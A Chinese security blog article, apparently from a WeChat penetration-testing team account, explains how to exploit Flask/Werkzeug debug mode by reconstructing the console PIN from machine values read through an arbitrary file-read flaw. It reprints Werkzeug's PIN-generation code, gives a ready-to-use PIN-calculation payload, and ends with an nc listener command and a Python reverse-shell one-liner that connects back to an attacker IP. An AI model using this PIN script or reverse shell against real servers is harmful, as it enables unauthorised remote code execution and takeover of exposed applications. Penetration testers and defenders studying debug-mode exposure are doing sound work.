\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/A69C1X4iG61dgUoncljXzw)

![](https://mmbiz.qpic.cn/mmbiz_gif/lFOEJLHA9qlicxGM47K4815LLNn8DTMZibibkkllDgjFG8nwKN4w3mSiaib9MQaV4THiaaZQ1icBU5dzMjwrHIjOoFolw/640?wx_fmt=gif)

**声明：**公众号大部分文章来自团队核心成员和知识星球成员，少部分文章经过原作者授权和其它公众号白名单转载。未经授权，严禁转载，如需转载，请联系开白！

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者及本公众号无关！！！

**START**

0x01 渗透案例引发的研究思路  

1、 日常渗透发现进入到一处系统的后台，随意点击了后台的一处功能，触发了该系统的 debug，如下图所示:

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmSAoJSyXqd15icL1hB5xqAxkvxWLWeNKksAHkrQp5o6UH3jDc9Vl4Ny8petYKXWGuT5WD4rNk8reA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmSAoJSyXqd15icL1hB5xqAxyaB9nSbKIPOXRiaZjDTy9ruibOk2bJkOQJEhmlfauhCUgtvEbKibgKnVg/640?wx_fmt=png)

2、 点击报错代码显示的黑框框 (输入框)，弹出一个需要输入 pin 码的输入框，如下图所示 (现在环境无法复现所以找了一个历史案例图)：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmSAoJSyXqd15icL1hB5xqAx5Xof4gTjeia5D3mPPMPAQDh9lcIfnacHpSbL5PvqnfdFudId094bgMQ/640?wx_fmt=png)

3、 经过查阅 flask 的 debug 模式的相关资料，发现我们如果成功获取 pin 码，可以在报错页面执行任意代码，但是我们现在无法获取 pin 码，那我们在本地开启一个简单的 flask 应用看看 pin 码到底是怎么产生的。

Flask 代码如下：

```
from flask import Flask

app = Flask(\_\_name\_\_)
@app.route('/')
def hello\_word():
    return None
if \_\_name\_\_ == '\_\_main\_\_':
app.run(host='0.0.0.0', port=9003, debug=True)
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmSAoJSyXqd15icL1hB5xqAxfLicsJGd6pST6niacqSfAOdV2UjGIjdjib9lScJ6gtqJR4ib2EiclFHX1icg/640?wx_fmt=png)

经过测试，同一台机器上多次启动同一个 flask 应用时，这个生成的 pin 码是固定的，是由一些固定的值进行生成的，不如直接去看 flask 源码是如何写的:

用 pycharm 在 app.run 下好断点，开启 debug 模式

由于代码写的还是相当官方的，很容易就能找到生成 pin 码的部分，代码所在的路径为: C:\\Python27\\Lib\\site-packages\\werkzeug\\debug, 其中关键的函数 get\_pin\_and\_cookie\_name() 如下:

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmSAoJSyXqd15icL1hB5xqAxPXiaZndep5NjrBnW2hV4D1wO1r30xHrCwmF1IJwt54NapqrQTovKibEQ/640?wx_fmt=png)

```
def get\_pin\_and\_cookie\_name(app):
    """Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns \`None\`.

    Second item in the resulting tuple is the cookie name for remembering.
    """
    pin = os.environ.get('WERKZEUG\_DEBUG\_PIN')
    rv = None
    num = None

    # Pin was explicitly disabled
    if pin == 'off':
        return None, None

    # Pin was provided explicitly
    if pin is not None and pin.replace('-', '').isdigit():
        # If there are separators in the pin, return it directly
        if '-' in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, '\_\_module\_\_',
                      getattr(app.\_\_class\_\_, '\_\_module\_\_'))

    try:
        # \`getpass.getuser()\` imports the \`pwd\` module,
        # which does not exist in the Google App Engine sandbox.
        username = getpass.getuser()
    except ImportError:
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably\_public\_bits = \[
        username,
        modname,
        getattr(app, '\_\_name\_\_', getattr(app.\_\_class\_\_, '\_\_name\_\_')),
        getattr(mod, '\_\_file\_\_', None),
    \]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private\_bits = \[
        str(uuid.getnode()),
        get\_machine\_id(),
    \]

    h = hashlib.md5()
    for bit in chain(probably\_public\_bits, private\_bits):
        if not bit:
            continue
        if isinstance(bit, text\_type):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie\_name = '\_\_wzd' + h.hexdigest()\[:20\]

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))\[:9\]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group\_size in 5, 4, 3:
            if len(num) % group\_size == 0:
                rv = '-'.join(num\[x:x + group\_size\].rjust(group\_size, '0')
                              for x in range(0, len(num), group\_size))
                break
        else:
            rv = num

    return rv, cookie\_name
```

return 的 rv 变量就是生成的 pin 码

最主要的就是这一段哈希部分：

```
for bit in chain(probably\_public\_bits, private\_bits):
    if not bit:
        continue
    if isinstance(bit, text\_type):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
```

连接了两个列表，然后循环里面的值做哈希，这两个列表的定义:

```
probably\_public\_bits = \[
        username,
        modname,
        getattr(app, '\_\_name\_\_', getattr(app.\_\_class\_\_, '\_\_name\_\_')),
        getattr(mod, '\_\_file\_\_', None),
    \]

    private\_bits = \[
        str(uuid.getnode()),
        get\_machine\_id(),
    \]
```

1、probably\_public\_bits 包含 4 个字段，分别为 username,modname,getattr(app, “name“, app.class.name),getattr(mod, “file“, None)，其中 username 对应的值为当前主机的用户名，modname 的值为’flask.app’，getattr(app, “name“, app.class.name) 对应的值为’Flask’,getattr(mod, “file“, None) 对应的值为 app 包的绝对路径。

2、private\_bits 包含两个字段，分别为 str(uuid.getnode()) 和 get\_machine\_id(), 其中 str(uuid.getnode()) 为网卡 mac 地址的十进制值，在 linux 系统下得到存储位置为 / sys/class/net/ens33（对应网卡）/address，get\_machine\_id() 的值为当前机器唯一的机器码，在 linux 系统下的存储位置为 / etc/machine-id

当我们获取到这六个参数的值时，就可以通过脚本推算出生成的 pin 码，然后进行任意命令执行。

0x02 ****漏洞利用****

1、flask debug 模式无开启 pin 码验证
---------------------------

可直接进入交互式的 python shell 进行命令执行。 

2、flask debug 模式开启了 pin 码验证
---------------------------

1、一般都是需要通过任意文件读取读取到生成 pin 码 private\_bits() 所需要的 2 个参数值。

2、通过 debug 报错代码获取到 public\_bits() 所需要的 4 个参数值。

3、然后使用以下 payload 计算出 pin:

```
import hashlib
from itertools import chain
probably\_public\_bits = \[
    'Administrator',# username
    'flask.app',# modname
    'Flask',# getattr(app, '\_\_name\_\_', getattr(app.\_\_class\_\_, '\_\_name\_\_'))
    'C:\\Users\\Administrator\\PycharmProjects\\securritystudy\\venv\\lib\\site-packages\\flask\\app.py' # getattr(mod, '\_\_file\_\_', None),
\]

private\_bits = \[
    '106611682152170',# str(uuid.getnode()),  /sys/class/net/ens33/address
    b'6893142a-ab05-4293-86f9-89df10a4361b'# get\_machine\_id(), /etc/machine-id
\]

h = hashlib.md5()
for bit in chain(probably\_public\_bits, private\_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie\_name = '\_\_wzd' + h.hexdigest()\[:20\]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))\[:9\]

rv =None
if rv is None:
    for group\_size in 5, 4, 3:
        if len(num) % group\_size == 0:
            rv = '-'.join(num\[x:x + group\_size\].rjust(group\_size, '0')
                          for x in range(0, len(num), group\_size))
            break
    else:
        rv = num

print(rv)
```

如下图所示：  

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmSAoJSyXqd15icL1hB5xqAxqOKbhJG2FKtGDGOr1fyvuiaMIlwxpribhGV14icnvU6NZ9wcU5GY9hJgA/640?wx_fmt=png)

4、 然后就可以进入交互式的 python shell 进行命令执行。

比如使用 python 进行反弹 shell。

步骤如下:

1、 在攻击机 (A) 上开启一个 nc 监听端口。

Nc -lvvp 8888

2、 在 debug 的 console 页面上输入 python 反弹 shell 的代码进行反弹到攻击机上。

代码如下:

```
import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("攻击机IP",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);
```

0x03 总结

1、正常 flask 开启了 debug 模式，如果没有开启 pin 码进行校验，可直接获取 python 交互式 shell 进行命令执行

2、 flask 开启了 debug 模式，但是开启了 pin 码校验，如果对应的 flask 应用没有任意文件读取的漏洞是无法获取到生成 pin 所需要的 6 个参数值的，无法获取交互式 python shell。

3、flask 开启了 debug 模式，且开启了 pin 码校验，且对应的应用存在任意文件读取的漏洞，可以通过文件读取获取到 username、modname、getattr(app, '\_\_name\_\_', getattr(app.\_\_class\_\_, '\_\_name\_\_'))、getattr(mod, '\_\_file\_\_', None)、str(uuid.getnode()),  /sys/class/net/ens33/address、get\_machine\_id(), /etc/machine-id，从而通过脚本生成 pin 码，然后获取 python 交互式 shell，进行命令执行.

0x04 参考链接

https://zhuanlan.zhihu.com/p/32138231

https://xz.aliyun.com/t/2553#toc-2

https://www.dazhuanlan.com/2019/12/05/5de8c90ee03dd/?\_\_cf\_chl\_jschl\_tk\_\_=6297c338db1048cd0af15fe375956340bbce6156-1601270282-0-AYlx\_7583zw\_1g7Q7rHBo6L-5t4evM5Lw4yjLav\_1CEFCn2PNq0qWkKcsYK95Fw5Lsvt88XATE26KexsrJSlK2wtY9TIZuC7abxIwJwGkWA-rxP2nUqdchaz6qWeVQ\_ucUTxsM0ft5q69yMs6\_c13NWXUy5Jb7DyUQ-CSKNuICy02DrQsVA46eUtnxT0XWHA0twB2tYuqlf1i-ZNGgzgatTZvV69ltExMrWUWx8IGM7jmF6I2FihCIJ1-tsebIL0w6xG\_jZFNeS-UJVk3C8iozHdWkde0sARVUJJ4SNlUE63B5yxxDwpb6Ukl\_OAseGo9w

  

  

  

  

**END**

* * *

  

**免费星球：**要求每个人在两周内输出一篇文章发到星球里面，文章为星球成员自己整理的内容，如超过两周没有文章输出的将被拉黑一个月，超过 3 次将被踢出星球，永久禁止加入！

**收费星球：**进入的星球成员可以在里面学习一年，包括贝塔安全实验室整理好的学习资料，可让星球管理及合伙人邀请加入免费星球，可以不用发文章，加入的免费星球免踢一年！

| 

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9ql3aeHJgZ66ibibFw4OibjvDos7YuK3k1fbic4pJsibwhVkBicdjmQbricFx6gKwEoGqLQuIaVeMjoBP2Yibg/640?wx_fmt=png)

 | 

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9ql3aeHJgZ66ibibFw4OibjvDossWnjm1H72RRcpfIrib6YpWsQ6v6j63sC7ClnZibCgEWPISIpoK1Afm2g/640?wx_fmt=png)

 |![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qnvGHiapxEr9yj0I36sAgvUErOgpelOJrS93wLRGQXJCORkfRc8EEm4C0dq9SsaGicy9eYMR7xEwMGg/640?wx_fmt=png)